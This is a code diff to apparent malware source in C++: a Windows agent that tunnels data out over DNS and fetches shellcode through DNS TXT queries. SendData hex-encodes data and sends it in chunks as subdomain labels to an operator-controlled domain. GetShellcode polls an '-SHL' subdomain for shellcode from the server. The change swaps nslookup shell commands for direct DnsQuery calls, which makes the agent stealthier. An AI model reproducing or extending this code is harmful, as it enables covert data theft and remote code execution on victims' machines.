@@ -21,7 +21,6 @@ BOOL SendData(LPSTR agentName, LPSTR data){
 	if(data_length > chunk_size){
 		for(unsigned int i=0; i < data_length; i+=chunk_size){
 			temp_data.str(std::string()); // Clear the temp_data stream
-			
 			if(i == 0){
 				temp_data << "7b21" << hex_data.substr(i,chunk_size);// Appends the beginning signature to the data
 			}else if((i+data_remainder)>=data_length){
@@ -29,6 +28,7 @@ BOOL SendData(LPSTR agentName, LPSTR data){
 			}else{
 				temp_data << hex_data.substr(i,chunk_size);
 			}
+
 			response = SendDNSPacket(agentName,"DATA",temp_data.str().c_str());
 		}
 	}else{
@@ -62,36 +62,52 @@ VOID DataToHEX(const std::string str, std::string& hexstr, bool capital = false)
 
 std::string SendDNSPacket(LPSTR agentName,LPSTR packetType,LPCSTR responseData){
 	
-	LPSTR command = new CHAR[MAX_CMD_LENGTH+1];
-	
+	LPSTR domain = new CHAR[MAX_DOMAIN_LENGTH+1];
+	std::string response;
+	PDNS_RECORD dnsRecord;
+
 	if(lstrlen(responseData) == 0){
 		// This is probably a probe or command request
-		StringCbPrintf(command,MAX_CMD_LENGTH,"nslookup -type=txt %s-%s.google.com %s",agentName,packetType,HOST);
+		StringCbPrintf(domain,MAX_DOMAIN_LENGTH,"%s-%s.%s",agentName,packetType,DOMAIN_NAME);
 		
 	}else{
 		// This sends the data to the server.
-		StringCbPrintf(command,MAX_CMD_LENGTH,"nslookup -type=txt %s-%s-%s.google.com %s",agentName,packetType,responseData,HOST);
+		StringCbPrintf(domain,MAX_DOMAIN_LENGTH,"%s-%s-%s.%s",agentName,packetType,responseData,DOMAIN_NAME);
 	}
+	
+	WORD dnsType = DNS_TYPE_TEXT;
+	DNS_STATUS dnsStatus;
+	dnsStatus = DnsQuery(domain,dnsType,DNS_QUERY_BYPASS_CACHE,NULL,&dnsRecord,NULL);
 
-	std::cout << command;
-	std::string response = ExecuteCommand(command);
+	if(!dnsStatus){
+		response = dnsRecord->Data.TXT.pStringArray[0];
+	}else{
+		response = "ERROR";
+	}
 	cout << response;
 	return response;
 }
 
 
 std::string GetShellcode(LPSTR agentName){
-	LPSTR command = new CHAR[MAX_CMD_LENGTH+1];
+	LPSTR domain = new CHAR[MAX_DOMAIN_LENGTH+1];
 	
 	BOOL bEnd = FALSE;
 	std::string response;
 	std::string shellcode;
+	PDNS_RECORD dnsRecord;
+	WORD dnsType = DNS_TYPE_TEXT;
+	DNS_STATUS dnsStatus;
 
-	StringCbPrintf(command,MAX_CMD_LENGTH,"nslookup -type=txt %s-SHL.google.com %s",agentName,HOST);
+	StringCbPrintf(domain,MAX_DOMAIN_LENGTH,"%s-SHL.%s",agentName,DOMAIN_NAME);
 
 	while(!bEnd){
-		response = GetTxtFromDNS(ExecuteCommand(command));
 
+		dnsStatus = DnsQuery(domain,dnsType,DNS_QUERY_BYPASS_CACHE,NULL,&dnsRecord,NULL);
+		if(!dnsStatus){
+			response = dnsRecord->Data.TXT.pStringArray[0];
+		}
+		
 		if(response.find(NO_SHELLCODE) != std::string::npos){
 			return NO_SHELLCODE;
 		}
@@ -124,11 +140,6 @@ std::string GetShellcode(LPSTR agentName){
 
 }
 
-std::string GetTxtFromDNS(std::string response){
-	response.erase(0,(int)response.find("\"")+1);
-	response.erase((int)response.find("\""),response.length());
-	return response;
-}
 
 std::string ExecuteCommand(LPCSTR cmd) {
 	std::string data;
